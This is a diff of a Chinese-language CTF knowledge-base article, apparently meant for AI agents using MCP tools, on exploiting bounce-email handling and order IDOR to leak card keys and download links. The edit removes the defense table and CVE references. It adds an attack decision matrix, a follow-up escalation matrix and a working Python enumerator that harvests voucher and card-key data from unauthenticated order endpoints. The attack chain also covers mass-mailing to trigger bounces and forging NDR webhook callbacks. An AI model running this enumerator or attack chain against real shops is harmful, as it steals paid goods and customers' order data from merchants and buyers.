@@ -12,9 +12,9 @@ board: "ctf-website"
 category: "12-payment"
 signals: ["退信", "NDR", "bounce", "IDOR", "订单号", "卡密泄露", "order leak", "CWE-639", "CWE-862"]
 mcp_tools: ["http_probe", "kb_router", "kb_read_file"]
-keywords: ["退信攻击", "bounce email", "IDOR", "订单越权", "卡密泄露", "CWE-639", "NDR利用", "邮件安全"]
-difficulty: "intermediate"
-tags: ["idor", "email-security", "information-disclosure", "payment", "web-security", "ctf"]
+keywords: ["退信攻击", "bounce email", "IDOR", "订单越权", "卡密泄露", "CWE-639", "NDR利用", "邮件退信链"]
+difficulty: "advanced"
+tags: ["idor", "email-bounce", "information-disclosure", "payment", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
 related_articles: ["ctf-website/14-idor/01-idor-enumeration"]
@@ -72,14 +72,16 @@ related_articles: ["ctf-website/14-idor/01-idor-enumeration"]
 攻击者知道订单号 → GET /orders/{id} → 返回完整订单含卡密
 ```
 
-**真实 CVE 先例**：
+## 判定矩阵
 
-| CVE | 产品 | 漏洞 |
-|-----|------|------|
-| CVE-2026-25757 | Spree Commerce | 未认证用户凭订单号查看访客订单 PII，`authorize_access` 对 `user_id=nil` 直接返回 true |
-| CVE-2026-32270 | Craft Commerce | 匿名支付邮箱验证失败，JSON 错误响应仍序列化返回完整订单对象 |
-| CVE-2025-12919 | EverShop | GraphQL `order` 查询无鉴权，UUID 可枚举，泄露姓名/邮箱/地址/支付状态 |
-| CVE-2024-33003 | SAP Commerce (CVSS 9.1) | 优惠券/卡密在 URL 参数中泄露，可被日志/Referer 头截获 |
+| 信号 | 直接动作 | 命中样本 | 失败样本 |
+|------|----------|----------|----------|
+| 订单号自增或短随机串 | 匿名/B 账号请求 A 订单详情 | 返回 `status/amount/card_key/download_url` | 只返回公共状态或 404 |
+| 邮件链接含 `order_id/token` | 改 `order_id`、保留 token、换账号访问 | token 不绑定订单或邮箱 | token 与订单/邮箱强绑定 |
+| 退信含原始正文 | 用不存在邮箱下单，解析 NDR multipart | 原始 HTML/文本里有卡密/下载链接 | 只返回 SMTP headers |
+| 退信 webhook 暴露 | 构造 DSN JSON/XML/表单回调 | 回调响应带订单对象或触发重发 | 仅接受真实队列事件 |
+| 订单查询 GraphQL | 替换 `id/orderNo/email` 参数 | 非所有者读到订单节点 | resolver 过滤当前用户 |
+| 下单即预生成卡密 | 未支付订单触发通知/退信 | 未支付也能看到卡密字段 | 发货时才生成卡密 |
 
 ## 攻击链
 
@@ -95,7 +97,7 @@ related_articles: ["ctf-website/14-idor/01-idor-enumeration"]
    a. 发送大量邮件到 @nonexist.example.com → 触发退信
    b. 分析退信内容，提取卡密字段
    c. 如果退信是 webhook 回调：模拟 NDR 格式 POST 到系统退信端点
-6. 批量枚举：遍历订单号 → 收集卡密 → 使用/转售
+6. 批量枚举：遍历订单号 → 收集卡密/下载链接/flag → 回填命中与失败样本
 ```
 
 ## Frida/JS Hook 辅助
@@ -132,7 +134,7 @@ def test_order_idor(base_url, order_id_range):
     for oid in order_id_range:
         # 不带 Cookie 请求
         r = requests.get(f"{base_url}/api/order/detail", params={"id": oid})
-        if r.status_code == 200 and "卡密" in r.text or "voucher" in r.text.lower():
+        if r.status_code == 200 and ("卡密" in r.text or "voucher" in r.text.lower()):
             print(f"[!] IDOR found: order {oid} leaks card key")
             print(f"    Response: {r.text[:500]}")
 
@@ -149,17 +151,50 @@ def test_order_idor(base_url, order_id_range):
 test_order_idor("https://target.com", range(1000, 1100))
 ```
 
-## 防御
+### 订单窗口枚举器
 
-| 层面 | 措施 |
-|------|------|
-| **订单查询** | 必须验证请求者身份（session/token），不能仅凭订单号 |
-| **访客订单** | 访客订单也应有随机 token，不能因为 `user_id=NULL` 就跳过鉴权 |
-| **退信处理** | 退信回调接口必须验证来源（IP 白名单、HMAC 签名、邮件服务器专用凭证） |
-| **退信内容** | 配置邮件服务器仅回传邮件头（headers），不包含原始邮件正文 |
-| **卡密生成** | 仅在支付确认后生成并发送卡密，下单时不预生成；或预生成但不通过邮件明文传输 |
-| **订单号** | 使用 UUID v4 代替自增 ID 作为外部订单号，增加枚举难度 |
-| **频率限制** | 对订单查询接口加 rate limiting，防止批量枚举 |
+```python
+import csv
+import re
+import requests
+
+KEY_RX = re.compile(r"(card[_-]?key|voucher|coupon|download|flag\{[^}]+\})", re.I)
+
+def enumerate_orders(base, start, end, cookie=None):
+    s = requests.Session()
+    if cookie:
+        s.headers["Cookie"] = cookie
+    rows = []
+    for oid in range(start, end + 1):
+        for path in (f"/order/{oid}", "/api/order/detail"):
+            params = {} if path.startswith("/order/") else {"id": oid}
+            r = s.get(base + path, params=params, timeout=8, allow_redirects=False)
+            hit = bool(KEY_RX.search(r.text))
+            rows.append({
+                "order_id": oid,
+                "path": path,
+                "status": r.status_code,
+                "length": len(r.text),
+                "hit": hit,
+                "sample": r.text[:160].replace("\n", "\\n"),
+            })
+            if hit:
+                print("[hit]", oid, path, r.text[:240])
+    with open("order_bounce_idor_matrix.csv", "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=rows[0].keys())
+        w.writeheader()
+        w.writerows(rows)
+```
+
+## 下一跳矩阵
+
+| 命中结果 | 下一步 | 关联文档 |
+|----------|--------|----------|
+| 读到卡密/下载链接 | 检查是否绑定订单所有者、是否可重复领取 | `payment-digital-goods.md` |
+| 读到支付状态/金额 | 尝试替换回调里的 `order_id/out_trade_no` | `payment-callback-async.md` |
+| 读到邮箱/手机号 | 构造退信、找邮件模板、找通知重发接口 | 本文 |
+| 读到商品/sku/plan | 做低价 SKU + 高价权益错配 | `payment-logic.md` |
+| 读到数据库字段名 | 反推订单表、卡密表、优惠券表 | `../24-database/05-backup-log-leak.md` |
 
 ## MCP 工具映射
 
@@ -172,19 +207,11 @@ AI Agent 可调用以下 MCP 工具自动检测上述漏洞：
 | 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
 | 批量测试 | 编写 Python 脚本 | 循环枚举订单号，检测 IDOR |
 
-## 参考资料
-
-- [CVE-2026-25757] Spree Commerce — Unauthenticated Guest Order Access via IDOR
-- [CVE-2026-32270] Craft Commerce — Anonymous Payment Order Data Leak in Error Response
-- [CVE-2025-12919] EverShop — GraphQL Order Query Without Authentication
-- [CVE-2024-33003] SAP Commerce Cloud — Voucher Codes Exposed in URLs (CVSS 9.1)
-- [CWE-639] Authorization Bypass Through User-Controlled Key
-- [CWE-200] Exposure of Sensitive Information to an Unauthorized Actor
-
 ## Evidence
 
 - `order_probe_matrix.csv`: order_id、email/token、登录态、状态码、响应长度、关键字段。
 - `bounce_payloads.json`: 退信/邮件链接里的订单号、签名、一次性 token、过期时间。
 - `role_compare.json`: 匿名、订单所有者、其他用户、管理员的响应字段 diff。
+- `order_bounce_idor_matrix.csv`: 订单窗口枚举输出、命中字段、响应样本。
 - 成功样本: 非订单所有者读到订单、支付状态、下载链接、优惠券或 flag。
 - 失败样本: 只返回公共状态、链接过期、token 绑定邮箱或订单所有者。
